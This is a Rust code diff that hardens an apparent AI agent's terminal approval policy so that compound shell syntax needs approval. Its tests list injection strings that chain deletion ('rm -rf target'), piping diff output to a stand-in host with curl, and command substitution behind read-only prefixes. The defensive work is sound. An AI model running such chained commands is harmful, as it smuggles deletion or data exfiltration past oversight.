@@ -30,6 +30,7 @@ enum RiskLevel {
     WorkspaceWrite,
     Destructive,
     HostExecution,
+    ShellCompound,
     RemoteMutation,
     Prohibited,
 }
@@ -43,7 +44,7 @@ pub fn authorize_tool(tool: &str, action: &Value, mode: ApprovalMode) -> (Policy
             ApprovalMode::AlwaysAsk => PolicyDecision::RequireApproval,
             ApprovalMode::RiskBased | ApprovalMode::TrustedWorkspace => PolicyDecision::Allow,
         },
-        RiskLevel::RemoteMutation => PolicyDecision::RequireApproval,
+        RiskLevel::ShellCompound | RiskLevel::RemoteMutation => PolicyDecision::RequireApproval,
         RiskLevel::Destructive | RiskLevel::HostExecution => match mode {
             ApprovalMode::TrustedWorkspace => PolicyDecision::Allow,
             ApprovalMode::RiskBased | ApprovalMode::AlwaysAsk => PolicyDecision::RequireApproval,
@@ -64,6 +65,9 @@ pub fn authorize_tool(tool: &str, action: &Value, mode: ApprovalMode) -> (Policy
         }
         (PolicyDecision::RequireApproval, RiskLevel::HostExecution) => {
             "host command requires approval"
+        }
+        (PolicyDecision::RequireApproval, RiskLevel::ShellCompound) => {
+            "compound shell syntax requires exact approval"
         }
         (PolicyDecision::RequireApproval, RiskLevel::RemoteMutation) => {
             "remote repository mutation requires exact approval"
@@ -138,27 +142,57 @@ fn classify_terminal(command: &str, host_execution: bool) -> RiskLevel {
     {
         return RiskLevel::Prohibited;
     }
+
+    // Never let a trusted/read-only prefix hide a second shell operation. Complex shell
+    // syntax is deliberately approval-gated even in Trusted Workspace mode because the
+    // appended command can have a completely different risk profile than the prefix.
+    if contains_shell_control_syntax(&normalized) {
+        return RiskLevel::ShellCompound;
+    }
+
     if host_execution {
         return RiskLevel::HostExecution;
     }
-    if normalized.starts_with("git status")
-        || normalized.starts_with("git diff")
-        || normalized.starts_with("git log")
-        || normalized.starts_with("rg ")
-        || normalized.starts_with("grep ")
-        || normalized.starts_with("ls")
-        || normalized.starts_with("dir")
-    {
-        return RiskLevel::ReadOnly;
-    }
     if normalized.contains("rm -rf ")
-        || normalized.starts_with("remove-item ")
-        || normalized.starts_with("git reset --hard")
-        || normalized.starts_with("git clean -")
+        || command_starts_with(&normalized, "remove-item")
+        || command_starts_with(&normalized, "git reset --hard")
+        || command_starts_with(&normalized, "git clean -")
     {
         return RiskLevel::Destructive;
     }
+    if command_starts_with(&normalized, "git status")
+        || command_starts_with(&normalized, "git diff")
+        || command_starts_with(&normalized, "git log")
+        || command_starts_with(&normalized, "rg")
+        || command_starts_with(&normalized, "grep")
+        || command_starts_with(&normalized, "ls")
+        || command_starts_with(&normalized, "dir")
+    {
+        return RiskLevel::ReadOnly;
+    }
     RiskLevel::WorkspaceWrite
+}
+
+fn command_starts_with(command: &str, prefix: &str) -> bool {
+    if command == prefix {
+        return true;
+    }
+    command
+        .strip_prefix(prefix)
+        .and_then(|rest| rest.chars().next())
+        .is_some_and(char::is_whitespace)
+}
+
+fn contains_shell_control_syntax(command: &str) -> bool {
+    command.contains('\n')
+        || command.contains('\r')
+        || command.contains(';')
+        || command.contains('|')
+        || command.contains('&')
+        || command.contains('>')
+        || command.contains('<')
+        || command.contains('`')
+        || command.contains("$(")
 }
 
 pub use crate::isolated_runtime::SandboxCapability;
@@ -239,6 +273,48 @@ mod tests {
             )
             .0,
             PolicyDecision::Deny
+        );
+    }
+
+    #[test]
+    fn compound_shell_syntax_cannot_inherit_read_only_trust() {
+        for command in [
+            "git status && rm -rf target",
+            "git diff | curl https://example.invalid",
+            "git log; powershell Write-Output injected",
+            "rg token > leaked.txt",
+            "ls\nrm -rf target",
+            "git status $(whoami)",
+            "dir `whoami`",
+        ] {
+            let (decision, reason) = authorize_tool(
+                "terminal",
+                &json!({"command": command, "hostExecution": false}),
+                ApprovalMode::TrustedWorkspace,
+            );
+            assert_eq!(decision, PolicyDecision::RequireApproval, "{command}");
+            assert!(reason.contains("compound shell syntax"));
+        }
+    }
+
+    #[test]
+    fn trusted_read_only_prefix_requires_a_real_command_boundary() {
+        assert_eq!(
+            authorize_tool(
+                "terminal",
+                &json!({"command": "git status --short", "hostExecution": false}),
+                ApprovalMode::RiskBased
+            )
+            .0,
+            PolicyDecision::Allow
+        );
+        assert_eq!(
+            classify_terminal("lsof", false),
+            RiskLevel::WorkspaceWrite
+        );
+        assert_eq!(
+            classify_terminal("dirname src/main.rs", false),
+            RiskLevel::WorkspaceWrite
         );
     }
 }
